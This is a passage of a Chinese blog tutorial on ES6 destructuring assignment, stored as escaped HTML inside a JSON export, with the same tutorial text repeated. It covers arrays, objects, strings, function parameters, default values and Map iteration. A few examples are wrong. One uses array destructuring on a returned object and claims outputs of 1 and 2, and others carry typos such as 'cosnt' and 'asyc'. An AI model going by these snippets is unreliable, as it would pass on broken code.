class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>对象解构赋值的内部机制：</strong>是先找到同名属性，然后再赋值给对应的变量。真正赋值的是后者，而不是前者</p>\n<h3 id=\"当变量名与属性名不同时：\"><a href=\"#当变量名与属性名不同时：\" class=\"headerlink\" title=\"当变量名与属性名不同时：\"></a>当变量名与属性名不同时：</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;foo:hello,bar:world&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\">hello // &#x27;abc&#x27;</span><br><span class=\"line\">world // &#x27;xyz&#x27;</span><br><span class=\"line\">foo // error: foo is not defined</span><br></pre></td></tr></table></figure>\n\n<p><strong>foo 是匹配的模式，hello 才是整正的变量</strong></p>\n<h3 id=\"数组解构赋值与对象结构赋值的差异：\"><a href=\"#数组解构赋值与对象结构赋值的差异：\" class=\"headerlink\" title=\"数组解构赋值与对象结构赋值的差异：\"></a><strong>数组解构赋值与对象结构赋值的差异</strong>：</h3><p>数组的元素是按次序排列的，变量的取值由位置决定；而对象没有次序，变量名必须与属性名相同，才能取到正确的值。</p>\n<h2 id=\"字符串的解构赋值\"><a href=\"#字符串的解构赋值\" class=\"headerlink\" title=\"字符串的解构赋值\"></a>字符串的解构赋值</h2><p>字符串结构赋值的时候，字符串被转换成了一个类似数组的对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const [a,b,c,d,e]=&#x27;hello&#x27;</span><br><span class=\"line\">a // &#x27;h&#x27;</span><br><span class=\"line\">b // &#x27;e&#x27;</span><br><span class=\"line\">c // &#x27;l&#x27;</span><br><span class=\"line\">d // &#x27;l&#x27;</span><br><span class=\"line\">e // &#x27;o&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">//这种类数组的对象，有length属性，因此也可以对length属性进行解构赋值</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;length:len&#125;=&#x27;hello&#x27;</span><br><span class=\"line\">len // 5</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"数值和布尔值的解构赋值\"><a href=\"#数值和布尔值的解构赋值\" class=\"headerlink\" title=\"数值和布尔值的解构赋值\"></a>数值和布尔值的解构赋值</h2><p>数值和布尔值进行解构赋值的时候，会先转换为对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;toString:s&#125; = 123</span><br><span class=\"line\">s // Number.prototype.toString</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;toString:s&#125; = true</span><br><span class=\"line\"></span><br><span class=\"line\">s // Boolean.prototype.toString</span><br><span class=\"line\"></span><br><span class=\"line\">//数值对象和布尔值的包装对象都有toString属性，因为变量s可以取到值</span><br></pre></td></tr></table></figure>\n\n<p><strong>解构赋值的规则：</strong>只要等号右边的值不是数组或者对象，就先将其转化为对象，由于 null 和 undefined 无法转化为对象，所以对他们解构赋值会报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;proxy:x&#125;=undefined;</span><br><span class=\"line\">x // TypeError</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;proxy:y&#125; = null;</span><br><span class=\"line\">y // TypeError</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数参数的解构赋值\"><a href=\"#函数参数的解构赋值\" class=\"headerlink\" title=\"函数参数的解构赋值\"></a>函数参数的解构赋值</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function add ([x,y])&#123;</span><br><span class=\"line\">\treturn x+y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add([1,2])  // 3</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h2><h3 id=\"交换变量的值（数组解构赋值）\"><a href=\"#交换变量的值（数组解构赋值）\" class=\"headerlink\" title=\"交换变量的值（数组解构赋值）\"></a>交换变量的值（数组解构赋值）</h3><p>在排序算法中，值交换是一个非常常见的操作，如果在 ES5 中交换两个变量的值，则必须引入第三个临时变量<br>没有解构赋值的情况下，交换两个变量需要一个临时变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let x=1;</span><br><span class=\"line\">let y=2;</span><br><span class=\"line\">[x,y] = [y,x]</span><br><span class=\"line\">x // 2</span><br><span class=\"line\">y // 1</span><br><span class=\"line\">// 如果右侧数组结构赋值的表达式的值为null或者undefined，则会导致程序抛出错误</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"从函数中返回多个值\"><a href=\"#从函数中返回多个值\" class=\"headerlink\" title=\"从函数中返回多个值\"></a>从函数中返回多个值</h2><p>从一个函数返回一个数组是十分常见的情况<br>但是函数只能返回一个值，如果需要返回多个值，只能将他放在数组或者对象里返回，有了结构赋值，取出这些值就非常方便</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 返回数组</span><br><span class=\"line\">function example()&#123;</span><br><span class=\"line\">\treturn [1,2,3]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let [a,b,c]=example()</span><br><span class=\"line\">a // 1</span><br><span class=\"line\">b // 2</span><br><span class=\"line\">c // 3</span><br><span class=\"line\"></span><br><span class=\"line\">// 返回对象</span><br><span class=\"line\">function example()&#123;</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">    foo:1,</span><br><span class=\"line\">    bar:2</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let [foo,bar]=example()</span><br><span class=\"line\">foo // 1</span><br><span class=\"line\">bar // 2</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数参数的定义\"><a href=\"#函数参数的定义\" class=\"headerlink\" title=\"函数参数的定义\"></a>函数参数的定义</h2><p>解构赋值，可以很方便的将一组参数与变量名对应起来 ##提取 JSON 数据<br>解构赋值在提取 JSON 数据尤为有用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let jsonData = &#123;</span><br><span class=\"line\">\tid:42,</span><br><span class=\"line\">   status:&quot;OK&quot;,</span><br><span class=\"line\">   data:[23,45]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;id,status,data&#125;=jsonData</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(id,status,data)</span><br><span class=\"line\">// 42,&quot;OK&quot;,[23,45]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"定义函数参数的默认值\"><a href=\"#定义函数参数的默认值\" class=\"headerlink\" title=\"定义函数参数的默认值\"></a>定义函数参数的默认值</h2><p>避免在函数体内部再写 var foo = config.foo || “default foo”这样的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jQuery.ajax= function(url,&#123;</span><br><span class=\"line\">   asyc=true,</span><br><span class=\"line\">   beforeSend=function()&#123;&#125;,</span><br><span class=\"line\">   cache=true,</span><br><span class=\"line\">   complete=function()&#123;&#125;,</span><br><span class=\"line\">   crossDomain=false,</span><br><span class=\"line\">   global = true,</span><br><span class=\"line\">   //  .... more config</span><br><span class=\"line\"> &#125;)&#123;</span><br><span class=\"line\">   // ... do stuff</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"遍历-Map-结构\"><a href=\"#遍历-Map-结构\" class=\"headerlink\" title=\"遍历 Map 结构\"></a>遍历 Map 结构</h2><p><strong>任何部署了 Iterator 接口的对象都可以使用 for…of 循环遍历</strong><br>Map 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值都非常方便</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var map = new Map()</span><br><span class=\"line\">map.set(&quot;first&quot;,&#x27;hello&#x27;)</span><br><span class=\"line\">map.set(&quot;second&quot;,&#x27;world&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">for (const [key,value] of map) &#123;</span><br><span class=\"line\">  console.log(key + &quot;is&quot; +value)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// first is hello</span><br><span class=\"line\">// second is world</span><br><span class=\"line\"></span><br><span class=\"line\">// 只想获取键名</span><br><span class=\"line\"> for (const [key] of map) &#123;</span><br><span class=\"line\">  //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> // 只想获取键值</span><br><span class=\"line\"> for (const [,value] of map) &#123;</span><br><span class=\"line\">  //</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"引入模块中的某些方法\"><a href=\"#引入模块中的某些方法\" class=\"headerlink\" title=\"引入模块中的某些方法\"></a>引入模块中的某些方法</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cosnt &#123;sourceMapConsumer,SourceNode&#125; = require(&#x27;source-map&#x27;)</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://es6.ruanyifeng.com/#docs/destructuring\">阮一峰《ES6 标准》</a></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"解构\"><a href=\"#解构\" class=\"headerlink\" title=\"解构\"></a>解构</h2><p>解构是一种打破数据结构，将其拆分成更小部分的过程。 #解构赋值的由来<br>在开发过程中，我们经常需要用到数组和对象，而从数组或对象中获取特定的数据并赋值给变量，这就需要编写这样的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let options = &#123;</span><br><span class=\"line\">\trepeat:true,</span><br><span class=\"line\">    save:false</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let repeat = options.repeat</span><br><span class=\"line\">let save = options.save</span><br><span class=\"line\"></span><br><span class=\"line\">// 如果你想提取更多变量，则必须编写类似的代码来给变量赋值，给开发者带来很大的麻烦，为此ES6添加了解构功能，方便我们提取数组或对象的值</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"数组的解构赋值\"><a href=\"#数组的解构赋值\" class=\"headerlink\" title=\"数组的解构赋值\"></a>数组的解构赋值</h2><h3 id=\"基本用法\"><a href=\"#基本用法\" class=\"headerlink\" title=\"基本用法\"></a>基本用法</h3><p><strong>解构赋值</strong>：在 ES6 中 ，按照一定模式从数组和对象中提取值，然后对变量进行赋值，这被称为解构赋值。<br>_本质_：这种写法属于“模式匹配”，只要等号两边的模式相同，<strong>左边的变量</strong>就会被赋予对应的值。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [foo,[bar],baz]=[1,[2],3]</span><br><span class=\"line\">foo // 1</span><br><span class=\"line\">bar // 2</span><br><span class=\"line\">baz // 3</span><br></pre></td></tr></table></figure>\n\n<p><strong>如果结构不成功，变量的值就为 undefined</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [x,y,...z]=[&#x27;a&#x27;]</span><br><span class=\"line\">x // &#x27;a&#x27;</span><br><span class=\"line\">y // undefined</span><br><span class=\"line\">z // []</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"默认值\"><a href=\"#默认值\" class=\"headerlink\" title=\"默认值\"></a>默认值</h3><p><strong>解构赋值允许指定默认值</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [foo=true]=[];</span><br><span class=\"line\">foo // true</span><br></pre></td></tr></table></figure>\n\n<p><strong>ES6 内部使用严格相等于运算符（===）来判断一个位置是否有值，如果数组的成员不严格等于 undefined，默认值就不会生效。即，一个位置的值不是 undefined，那么即使设置了默认值，也不会有效。</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let [x=1]=[undefined]</span><br><span class=\"line\">x // 1</span><br><span class=\"line\"></span><br><span class=\"line\">let [x=1] =[null]</span><br><span class=\"line\"></span><br><span class=\"line\">x // null</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"对象的解构赋值\"><a href=\"#对象的解构赋值\" class=\"headerlink\" title=\"对象的解构赋值\"></a>对象的解构赋值</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;foo,bar&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">foo // &#x27;abc&#x27;</span><br><span class=\"line\">bar // &#x27;xyz&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"当变量名和属性名相同时\"><a href=\"#当变量名和属性名相同时\" class=\"headerlink\" title=\"当变量名和属性名相同时\"></a>当变量名和属性名相同时</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;foo,bar&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\">foo // &#x27;abc&#x27;</span><br><span class=\"line\">bar // &#x27;xyz&#x27;</span><br><span class=\"line\">上述代码的实质应该是：</span><br><span class=\"line\">let &#123;foo:foo,bar:bar&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\">// 当变量名和属性名一样时，可以简写 &#123;foo,bar&#125;来代替&#123;foo:foo,bar:bar&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p><strong>对象解构赋值的内部机制：</strong>是先找到同名属性，然后再赋值给对应的变量。真正赋值的是后者，而不是前者</p>\n<h3 id=\"当变量名与属性名不同时：\"><a href=\"#当变量名与属性名不同时：\" class=\"headerlink\" title=\"当变量名与属性名不同时：\"></a>当变量名与属性名不同时：</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;foo:hello,bar:world&#125;=&#123;foo:&#x27;abc&#x27;,bar:&#x27;xyz&#x27;&#125;</span><br><span class=\"line\">hello // &#x27;abc&#x27;</span><br><span class=\"line\">world // &#x27;xyz&#x27;</span><br><span class=\"line\">foo // error: foo is not defined</span><br></pre></td></tr></table></figure>\n\n<p><strong>foo 是匹配的模式，hello 才是整正的变量</strong></p>\n<h3 id=\"数组解构赋值与对象结构赋值的差异：\"><a href=\"#数组解构赋值与对象结构赋值的差异：\" class=\"headerlink\" title=\"数组解构赋值与对象结构赋值的差异：\"></a><strong>数组解构赋值与对象结构赋值的差异</strong>：</h3><p>数组的元素是按次序排列的，变量的取值由位置决定；而对象没有次序，变量名必须与属性名相同，才能取到正确的值。</p>\n<h2 id=\"字符串的解构赋值\"><a href=\"#字符串的解构赋值\" class=\"headerlink\" title=\"字符串的解构赋值\"></a>字符串的解构赋值</h2><p>字符串结构赋值的时候，字符串被转换成了一个类似数组的对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const [a,b,c,d,e]=&#x27;hello&#x27;</span><br><span class=\"line\">a // &#x27;h&#x27;</span><br><span class=\"line\">b // &#x27;e&#x27;</span><br><span class=\"line\">c // &#x27;l&#x27;</span><br><span class=\"line\">d // &#x27;l&#x27;</span><br><span class=\"line\">e // &#x27;o&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">//这种类数组的对象，有length属性，因此也可以对length属性进行解构赋值</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;length:len&#125;=&#x27;hello&#x27;</span><br><span class=\"line\">len // 5</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"数值和布尔值的解构赋值\"><a href=\"#数值和布尔值的解构赋值\" class=\"headerlink\" title=\"数值和布尔值的解构赋值\"></a>数值和布尔值的解构赋值</h2><p>数值和布尔值进行解构赋值的时候，会先转换为对象</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;toString:s&#125; = 123</span><br><span class=\"line\">s // Number.prototype.toString</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;toString:s&#125; = true</span><br><span class=\"line\"></span><br><span class=\"line\">s // Boolean.prototype.toString</span><br><span class=\"line\"></span><br><span class=\"line\">//数值对象和布尔值的包装对象都有toString属性，因为变量s可以取到值</span><br></pre></td></tr></table></figure>\n\n<p><strong>解构赋值的规则：</strong>只要等号右边的值不是数组或者对象，就先将其转化为对象，由于 null 和 undefined 无法转化为对象，所以对他们解构赋值会报错</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let &#123;proxy:x&#125;=undefined;</span><br><span class=\"line\">x // TypeError</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;proxy:y&#125; = null;</span><br><span class=\"line\">y // TypeError</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数参数的解构赋值\"><a href=\"#函数参数的解构赋值\" class=\"headerlink\" title=\"函数参数的解构赋值\"></a>函数参数的解构赋值</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function add ([x,y])&#123;</span><br><span class=\"line\">\treturn x+y;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add([1,2])  // 3</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"用途\"><a href=\"#用途\" class=\"headerlink\" title=\"用途\"></a>用途</h2><h3 id=\"交换变量的值（数组解构赋值）\"><a href=\"#交换变量的值（数组解构赋值）\" class=\"headerlink\" title=\"交换变量的值（数组解构赋值）\"></a>交换变量的值（数组解构赋值）</h3><p>在排序算法中，值交换是一个非常常见的操作，如果在 ES5 中交换两个变量的值，则必须引入第三个临时变量<br>没有解构赋值的情况下，交换两个变量需要一个临时变量</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let x=1;</span><br><span class=\"line\">let y=2;</span><br><span class=\"line\">[x,y] = [y,x]</span><br><span class=\"line\">x // 2</span><br><span class=\"line\">y // 1</span><br><span class=\"line\">// 如果右侧数组结构赋值的表达式的值为null或者undefined，则会导致程序抛出错误</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"从函数中返回多个值\"><a href=\"#从函数中返回多个值\" class=\"headerlink\" title=\"从函数中返回多个值\"></a>从函数中返回多个值</h2><p>从一个函数返回一个数组是十分常见的情况<br>但是函数只能返回一个值，如果需要返回多个值，只能将他放在数组或者对象里返回，有了结构赋值，取出这些值就非常方便</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 返回数组</span><br><span class=\"line\">function example()&#123;</span><br><span class=\"line\">\treturn [1,2,3]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let [a,b,c]=example()</span><br><span class=\"line\">a // 1</span><br><span class=\"line\">b // 2</span><br><span class=\"line\">c // 3</span><br><span class=\"line\"></span><br><span class=\"line\">// 返回对象</span><br><span class=\"line\">function example()&#123;</span><br><span class=\"line\">    return &#123;</span><br><span class=\"line\">    foo:1,</span><br><span class=\"line\">    bar:2</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let [foo,bar]=example()</span><br><span class=\"line\">foo // 1</span><br><span class=\"line\">bar // 2</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数参数的定义\"><a href=\"#函数参数的定义\" class=\"headerlink\" title=\"函数参数的定义\"></a>函数参数的定义</h2><p>解构赋值，可以很方便的将一组参数与变量名对应起来 ##提取 JSON 数据<br>解构赋值在提取 JSON 数据尤为有用</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">let jsonData = &#123;</span><br><span class=\"line\">\tid:42,</span><br><span class=\"line\">   status:&quot;OK&quot;,</span><br><span class=\"line\">   data:[23,45]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">let &#123;id,status,data&#125;=jsonData</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(id,status,data)</span><br><span class=\"line\">// 42,&quot;OK&quot;,[23,45]</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"定义函数参数的默认值\"><a href=\"#定义函数参数的默认值\" class=\"headerlink\" title=\"定义函数参数的默认值\"></a>定义函数参数的默认值</h2><p>避免在函数体内部再写 var foo = config.foo || “default foo”这样的语句</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jQuery.ajax= function(url,&#123;</span><br><span class=\"line\">   asyc=true,</span><br><span class=\"line\">   beforeSend=function()&#123;&#125;,</span><br><span class=\"line\">   cache=true,</span><br><span class=\"line\">   complete=function()&#123;&#125;,</span><br><span class=\"line\">   crossDomain=false,</span><br><span class=\"line\">   global = true,</span><br><span class=\"line\">   //  .... more config</span><br><span class=\"line\"> &#125;)&#123;</span><br><span class=\"line\">   // ... do stuff</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"遍历-Map-结构\"><a href=\"#遍历-Map-结构\" class=\"headerlink\" title=\"遍历 Map 结构\"></a>遍历 Map 结构</h2><p><strong>任何部署了 Iterator 接口的对象都可以使用 for…of 循环遍历</strong><br>Map 结构原生支持 Iterator 接口，配合变量的解构赋值，获取键名和键值都非常方便</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var map = new Map()</span><br><span class=\"line\">map.set(&quot;first&quot;,&#x27;hello&#x27;)</span><br><span class=\"line\">map.set(&quot;second&quot;,&#x27;world&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">for (const [key,value] of map) &#123;</span><br><span class=\"line\">  console.log(key + &quot;is&quot; +value)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// first is hello</span><br><span class=\"line\">// second is world</span><br><span class=\"line\"></span><br><span class=\"line\">// 只想获取键名</span><br><span class=\"line\"> for (const [key] of map) &#123;</span><br><span class=\"line\">  //</span><br><span class=\"line\">&#125;</span><br><span 